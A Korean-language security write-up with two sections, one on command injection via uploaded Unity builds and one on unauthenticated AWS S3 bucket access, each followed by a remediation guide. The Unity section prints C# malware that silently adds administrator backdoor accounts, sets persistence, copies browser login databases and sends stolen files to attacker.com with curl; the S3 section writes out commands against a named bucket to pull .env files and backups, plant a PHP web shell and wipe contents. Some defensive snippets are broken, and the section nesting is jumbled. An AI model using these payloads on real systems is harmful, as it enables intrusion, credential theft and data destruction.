<details>
<summary><strong>Unity Command Injection</strong></summary>

## 목차
1. [정의&원리](#1-정의원리)
2. [조치 가이드](#2-조치-가이드)

---

## 1. 정의&원리

### 유니티 파일 업로드 시스템 명령어 실행 취약점이란?
웹 사이트에서 유니티 빌드 파일을 업로드하는 기능에서, 악성 스크립트가 포함된 파일에 대한 적절한 검증 없이 업로드를 허용할 때 발생하는 취약점입니다. 사용자가 해당 파일을 실행하면 악성 스크립트를 통해 시스템 명령어가 실행될 수 있습니다.

### 취약점 발생 위치
- **서버 측**: 유니티 빌드 파일 업로드 처리 과정
- **클라이언트 측**: 업로드된 유니티 파일 실행 시점
- **실행 환경**: 사용자 브라우저 또는 유니티 런타임 환경

### 공격 시나리오

#### 일반적인 공격 과정:
1. **악성 스크립트 작성**: C# 스크립트에 시스템 명령어 실행 코드 삽입
2. **유니티 프로젝트 빌드**: 악성 스크립트가 포함된 유니티 파일 생성
3. **파일 업로드**: 웹사이트에 악성 유니티 파일 업로드
4. **사용자 유인**: 정상적인 게임이나 애플리케이션으로 위장
5. **실행 및 공격**: 사용자가 버튼 클릭 시 시스템 명령어 실행

### 취약한 코드 패턴

#### 기본적인 악성 스크립트 구조:
```csharp
using UnityEngine;
using System.Diagnostics;

public class OpenURL : MonoBehaviour 
{
    public void testURL() 
    {
        // 기본 시스템 명령어 실행
        string cmdCommand = "/c start explorer \"C:\\\" & taskmgr & pause";
        Process.Start("cmd.exe", cmdCommand);
    }
}
```

#### 고급 악성 스크립트 패턴:
```csharp
using UnityEngine;
using System.Diagnostics;
using System.Collections;

public class AdvancedMalware : MonoBehaviour
{
    void Start()
    {
        // 지연 실행으로 탐지 회피
        StartCoroutine(DelayedExecution());
    }
    
    IEnumerator DelayedExecution()
    {
        yield return new WaitForSeconds(10f);
        
        // 시스템 정보 수집
        ExecuteCommand("systeminfo > %temp%\\sysinfo.txt");
        
        yield return new WaitForSeconds(2f);
        
        // 네트워크 정보 수집
        ExecuteCommand("ipconfig /all >> %temp%\\sysinfo.txt");
        
        yield return new WaitForSeconds(2f);
        
        // 사용자 계정 생성
        ExecuteCommand("net user hacker password123 /add");
        
        // 관리자 그룹 추가
        ExecuteCommand("net localgroup administrators hacker /add");
    }
    
    void ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c " + command;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            
            Process.Start(startInfo);
        }
        catch (System.Exception e)
        {
            Debug.Log("Command execution failed: " + e.Message);
        }
    }
}
```

### 공격 유형별 분류

#### 1.1. 직접 시스템 명령어 실행
```csharp
// 파일 시스템 조작
Process.Start("cmd.exe", "/c copy %USERPROFILE%\\Documents\\*.* %temp%\\stolen\\");

// 네트워크 스캔
Process.Start("cmd.exe", "/c for /L %i in (1,1,254) do ping -n 1 192.168.1.%i");

// 시스템 정보 수집
Process.Start("cmd.exe", "/c whoami /all > %temp%\\userinfo.txt");
```

#### 1.2. 권한 상승 시도
```csharp
// 관리자 계정 활성화
Process.Start("cmd.exe", "/c net user administrator /active:yes");

// 새로운 관리자 계정 생성
Process.Start("cmd.exe", "/c net user backdoor P@ssw0rd123! /add");
Process.Start("cmd.exe", "/c net localgroup administrators backdoor /add");

// UAC 우회 시도
Process.Start("cmd.exe", "/c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ");
```

#### 1.3. 지속성 확보
```csharp
// 시작 프로그램 등록
Process.Start("cmd.exe", "/c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemUpdate /d C:\\temp\\malware.exe");

// 스케줄 작업 생성
Process.Start("cmd.exe", "/c schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\temp\\backdoor.exe\" /sc daily /st 09:00");

// 서비스 등록
Process.Start("cmd.exe", "/c sc create BackdoorService binPath=\"C:\\temp\\service.exe\" start=auto");
```

#### 1.4. 데이터 탈취
```csharp
// 브라우저 데이터 수집
Process.Start("cmd.exe", "/c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" %temp%\\chrome_data.db");
Process.Start("cmd.exe", "/c copy \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\" %temp%\\");

// 문서 파일 수집
Process.Start("cmd.exe", "/c forfiles /p %USERPROFILE% /s /m *.pdf /c \"cmd /c copy @path %temp%\\docs\\\"");
Process.Start("cmd.exe", "/c forfiles /p %USERPROFILE% /s /m *.docx /c \"cmd /c copy @path %temp%\\docs\\\"");

// 데이터 외부 전송
Process.Start("cmd.exe", "/c curl -X POST -F \"file=@%temp%\\stolen_data.zip\" http://attacker.com/upload");
```

### 기술적 동작 원리

#### Unity WebGL vs Standalone 차이점:
```csharp
#if UNITY_WEBGL
    // WebGL에서는 일반적으로 System.Diagnostics.Process가 제한됨
    // 하지만 특정 조건에서 브라우저 API 활용 가능
    Application.ExternalEval("window.open('file:///C:/', '_blank');");
    
#elif UNITY_STANDALONE
    // Standalone 빌드에서는 직접적인 시스템 접근 가능
    Process.Start("cmd.exe", "/c dir C:\\ > %temp%\\directories.txt");
    
    // PowerShell 실행도 가능
    Process.Start("powershell.exe", "-Command Get-Process | Out-File %temp%\\processes.txt");
    
#endif
```

#### UI 이벤트와 연결:
```csharp
using UnityEngine;
using UnityEngine.UI;
using System.Diagnostics;

public class MaliciousButton : MonoBehaviour
{
    void Start()
    {
        // 버튼 컴포넌트 가져오기
        Button btn = GetComponent<Button>();
        
        // 클릭 이벤트에 악성 함수 연결
        btn.onClick.AddListener(() => {
            ExecuteMaliciousCode();
        });
        
        // 또는 다른 UI 이벤트 활용
        btn.onClick.AddListener(delegate { StartCoroutine(DelayedAttack()); });
    }
    
    void ExecuteMaliciousCode()
    {
        // 사용자가 버튼을 클릭하는 순간 실행
        Process.Start("cmd.exe", "/c taskmgr & explorer C:\\");
    }
    
    System.Collections.IEnumerator DelayedAttack()
    {
        // 5초 후 실행하여 의심을 피함
        yield return new WaitForSeconds(5f);
        
        Process.Start("cmd.exe", "/c net user attacker P@ssw0rd! /add /comment:\"System Account\"");
    }
}
```

---

## 2. 조치 가이드

### 2.1. 파일 업로드 검증

#### 2.1.1. 기본 파일 검증
```php
// 파일 확장자 및 크기 제한
$allowed_ext = ['unity3d', 'unityweb'];
$max_size = 10 * 1024 * 1024; // 10MB

if (!in_array($ext, $allowed_ext) || $file_size > $max_size) {
    reject_upload();
}
```

#### 2.1.2. 압축 파일 내용 스캔
```python
import zipfile
import re

def scan_unity_file(file_path):
    dangerous_patterns = [
        r'Process\.Start',
        r'System\.Diagnostics',
        r'cmd\.exe',
        r'net\s+user',
        r'reg\s+add'
    ]
    
    with zipfile.ZipFile(file_path, 'r') as zip_file:
        for file_info in zip_file.filelist:
            if file_info.filename.endswith('.cs'):
                content = zip_file.read(file_info).decode('utf-8', errors='ignore')
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return False  # 위험한 패턴 발견
    
    return True  # 안전
```

### 2.2. 실행 환경 보안

#### 2.2.1. 샌드박스 실행 환경 구축
```bash
# Docker를 이용한 격리된 실행 환경
FROM ubuntu:20.04
RUN useradd -m -s /bin/bash unity_user
USER unity_user
WORKDIR /sandbox

# 네트워크 접근 차단
RUN iptables -A OUTPUT -j DROP

# 파일 시스템 접근 제한
RUN mount -o ro /usr/bin
```

#### 2.2.2. 브라우저 보안 정책
```html
<!-- Content Security Policy 적용 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-eval';">

<!-- 권한 정책 제한 -->
<meta http-equiv="Permissions-Policy" 
      content="camera=(), microphone=(), geolocation=()">
```

### 2.3. 관리자 승인 시스템

#### 2.3.1. 수동 검토 프로세스
```sql
-- 승인 대기 테이블 생성
CREATE TABLE file_approvals (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(255),
    upload_time DATETIME,
    status ENUM('pending', 'approved', 'rejected'),
    reviewer_id INT
);
```

#### 2.3.2. 48시간 검토 기간 설정
```php
// 업로드 후 48시간 대기 후 공개
$public_time = date('Y-m-d H:i:s', strtotime('+48 hours'));
$stmt = $pdo->prepare("UPDATE files SET public_time = ? WHERE id = ?");
$stmt->execute([$public_time, $file_id]);
```

### 2.4. 모니터링 시스템

#### 2.4.1. 실시간 로그 모니터링
```bash
# 시스템 명령어 실행 감지
tail -f /var/log/syslog | grep -E "(cmd.exe|powershell|net user)" | \
while read line; do
    echo "ALERT: Suspicious command detected - $line"
    # 관리자에게 알림 전송
done
```

#### 2.4.2. 파일 실행 추적
```javascript
// Unity WebGL 실행 시 모니터링
window.addEventListener('beforeunload', function(e) {
    // 비정상 종료 시 서버에 보고
    navigator.sendBeacon('/security-alert', {
        type: 'abnormal_exit',
        timestamp: new Date().toISOString()
    });
});
```

### 2.5. 응급 대응 절차

#### 2.5.1. 악성 파일 발견 시 조치
```bash
# 1. 즉시 파일 격리
mv /var/www/uploads/malicious_file.unity3d /quarantine/

# 2. 접근 로그 확인
grep "malicious_file" /var/log/apache2/access.log

# 3. 영향받은 사용자 파악
mysql -e "SELECT user_id, access_time FROM access_logs WHERE file_name LIKE '%malicious_file%'"
```

#### 2.5.2. 사용자 알림 및 조치
```php
// 긴급 보안 알림 발송
function send_security_alert($affected_users) {
    foreach ($affected_users as $user) {
        mail($user['email'], 
             '보안 알림', 
             '최근 실행하신 파일에서 보안 위험이 발견되어 제거했습니다. PC 검사를 권장합니다.');
    }


ㅡㅡㅡ
ㅡㅡㅡ

<details><summary><strong>AWS S3 Unauthorized Access</strong></summary>

## 목차
1. [정의&원리](#1-정의원리)
2. [조치 가이드](#2-조치-가이드)

---

## 1. 정의&원리

### AWS S3 무인증 접근 취약점이란?
AWS S3 버킷이 잘못 구성되어 인증 없이 접근 가능할 때 발생하는 취약점입니다. `--no-sign-request` 옵션을 사용하여 AWS CLI를 통해 인증 절차 없이 S3 버킷에 접근하여 파일 업로드, 다운로드, 나열 등의 작업을 수행할 수 있습니다.

### 취약점 발생 위치
- **AWS S3 버킷**: 퍼블릭 접근이 허용된 S3 버킷
- **버킷 정책**: 잘못 구성된 IAM 정책 및 ACL 설정
- **접근 제어**: 인증 및 권한 검증 우회

### 공격 시나리오

#### 일반적인 공격 과정:
1. **버킷 발견**: 공개된 S3 버킷 URL 또는 버킷명 수집
2. **AWS CLI 설치**: 공격자 시스템에 AWS CLI 도구 설치
3. **무인증 접근**: `--no-sign-request` 옵션으로 인증 우회
4. **권한 확인**: 버킷 내 파일 목록 조회 및 권한 테스트
5. **데이터 탈취/조작**: 파일 다운로드, 업로드, 삭제 등 수행

### 취약한 설정 패턴

#### 기본 공격 명령어:
```bash
# 1. 버킷 내 파일 목록 조회
aws s3 ls s3://ktcnaihumanstudio --no-sign-request --no-verify-ssl

# 2. 버킷 내 모든 파일 나열 (재귀적)
aws s3 ls s3://ktcnaihumanstudio --recursive --no-sign-request --no-verify-ssl

# 3. 특정 파일 다운로드
aws s3 cp s3://ktcnaihumanstudio/sensitive_data.txt ./stolen_data.txt --no-sign-request --no-verify-ssl

# 4. 악성 파일 업로드
aws s3 cp malicious_file.php s3://ktcnaihumanstudio/uploads/ --no-sign-request --no-verify-ssl

# 5. 버킷 전체 동기화 (모든 파일 다운로드)
aws s3 sync s3://ktcnaihumanstudio ./stolen_bucket --no-sign-request --no-verify-ssl
```

### 공격 유형별 분류

#### 1.1. 데이터 탈취
```bash
# 민감한 파일 검색 및 다운로드
aws s3 ls s3://ktcnaihumanstudio --recursive --no-sign-request | grep -E "\.(pdf|docx|xlsx|txt|log)$"

# 설정 파일 탈취
aws s3 cp s3://ktcnaihumanstudio/.env ./config_files/ --no-sign-request
aws s3 cp s3://ktcnaihumanstudio/config/database.yml ./config_files/ --no-sign-request

# 로그 파일 수집
aws s3 sync s3://ktcnaihumanstudio/logs/ ./stolen_logs/ --no-sign-request

# 백업 파일 탈취
aws s3 cp s3://ktcnaihumanstudio/backups/db_backup.sql ./database_backup.sql --no-sign-request
```

#### 1.2. 악성 파일 업로드
```bash
# 웹쉘 업로드
echo '<?php system($_GET["cmd"]); ?>' > webshell.php
aws s3 cp webshell.php s3://ktcnaihumanstudio/public/shell.php --no-sign-request

# 피싱 페이지 업로드
aws s3 cp fake_login.html s3://ktcnaihumanstudio/login.html --no-sign-request

# 멀웨어 배포
aws s3 cp malware.exe s3://ktcnaihumanstudio/downloads/update.exe --no-sign-request

# 대용량 파일 업로드 (서비스 방해)
dd if=/dev/zero of=large_file.bin bs=1M count=1000  # 1GB 파일 생성
aws s3 cp large_file.bin s3://ktcnaihumanstudio/ --no-sign-request
```

#### 1.3. 버킷 내용 조작
```bash
# 기존 파일 삭제
aws s3 rm s3://ktcnaihumanstudio/important_file.txt --no-sign-request

# 파일 덮어쓰기
echo "Hacked by attacker" > hacked.txt
aws s3 cp hacked.txt s3://ktcnaihumanstudio/index.html --no-sign-request

# 버킷 전체 삭제 (가능한 경우)
aws s3 rm s3://ktcnaihumanstudio --recursive --no-sign-request
```

#### 1.4. 정보 수집 및 정찰
```bash
# 버킷 정책 확인
aws s3api get-bucket-policy --bucket ktcnaihumanstudio --no-sign-request

# 버킷 ACL 조회
aws s3api get-bucket-acl --bucket ktcnaihumanstudio --no-sign-request

# 버킷 위치 확인
aws s3api get-bucket-location --bucket ktcnaihumanstudio --no-sign-request

# 버킷 버전 관리 상태 확인
aws s3api get-bucket-versioning --bucket ktcnaihumanstudio --no-sign-request

# 멀티파트 업로드 상태 확인
aws s3api list-multipart-uploads --bucket ktcnaihumanstudio --no-sign-request
```

### 기술적 동작 원리

#### AWS CLI 옵션 설명:
```bash
# --no-sign-request: AWS 인증 서명 없이 요청
# --no-verify-ssl: SSL 인증서 검증 생략
# --recursive: 하위 디렉토리까지 재귀적 처리
# --dryrun: 실제 실행 없이 명령어 테스트

# 실제 명령어 구조
aws s3 [command] [source] [destination] [options]
```

#### 잘못된 S3 버킷 정책 예시:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "s3:GetObject",
                "s3:GetObjectVersion",
                "s3:ListBucket",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::ktcnaihumanstudio",
                "arn:aws:s3:::ktcnaihumanstudio/*"
            ]
        }
    ]
}
```

#### 취약한 ACL 설정:
```bash
# 모든 사용자에게 읽기/쓰기 권한 부여 (위험)
aws s3api put-bucket-acl --bucket ktcnaihumanstudio --acl public-read-write

# 인증된 사용자에게 모든 권한 부여 (위험)
aws s3api put-bucket-acl --bucket ktcnaihumanstudio --acl authenticated-read
```

---

## 2. 조치 가이드

### 2.1. 버킷 접근 제어 강화

#### 2.1.1. 버킷 정책 수정
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyPublicAccess",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::ktcnaihumanstudio",
                "arn:aws:s3:::ktcnaihumanstudio/*"
            ],
            "Condition": {
                "StringNotEquals": {
                    "aws:PrincipalServiceName": [
                        "cloudfront.amazonaws.com"
                    ]
                }
            }
        }
    ]
}
```

#### 2.1.2. 퍼블릭 액세스 차단
```bash
# S3 퍼블릭 액세스 완전 차단
aws s3api put-public-access-block \
    --bucket ktcnaihumanstudio \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### 2.2. IAM 정책 강화

#### 2.2.1. 최소 권한 원칙 적용
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject"
            ],
            "Resource": "arn:aws:s3:::ktcnaihumanstudio/public/*",
            "Condition": {
                "StringEquals": {
                    "s3:x-amz-acl": "bucket-owner-full-control"
                }
            }
        }
    ]
}
```

#### 2.2.2. MFA 인증 강제
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::ktcnaihumanstudio",
                "arn:aws:s3:::ktcnaihumanstudio/*"
            ],
            "Condition": {
                "BoolIfExists": {
                    "aws:MultiFactorAuthPresent": "false"
                }
            }
        }
    ]
}
```

### 2.3. 모니터링 설정

#### 2.3.1. CloudTrail 로그 모니터링
```bash
# S3 접근 로그 조회
aws logs filter-log-events \
    --log-group-name CloudTrail/S3DataEvents \
    --filter-pattern "{ $.eventName = GetObject || $.eventName = PutObject }"
```

#### 2.3.2. CloudWatch 알람 설정
```bash
# 비정상적인 S3 접근 알람
aws cloudwatch put-metric-alarm \
    --alarm-name "S3-Unauthorized-Access" \
    --alarm-description "Detect unauthorized S3 access" \
    --metric-name "UnauthorizedApiCalls" \
    --namespace "AWS/S3" \
    --statistic "Sum" \
    --period 300 \
    --threshold 5 \
    --comparison-operator "GreaterThanThreshold"
```

### 2.4. 응급 대응 절차

#### 2.4.1. 즉시 버킷 격리
```bash
# 1. 퍼블릭 액세스 즉시 차단
aws s3api put-public-access-block \
    --bucket ktcnaihumanstudio \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# 2. 버킷 정책 제거
aws s3api delete-bucket-policy --bucket ktcnaihumanstudio
```

#### 2.4.2. 보안 감사
```bash
# 최근 접근 로그 분석
aws s3api get-bucket-logging --bucket ktcnaihumanstudio

# 업로드된 파일 점검
aws s3 ls s3://ktcnaihumanstudio --recursive | grep -E "\.(php|jsp|asp|exe)$"
```

</details>
}
```

</details>
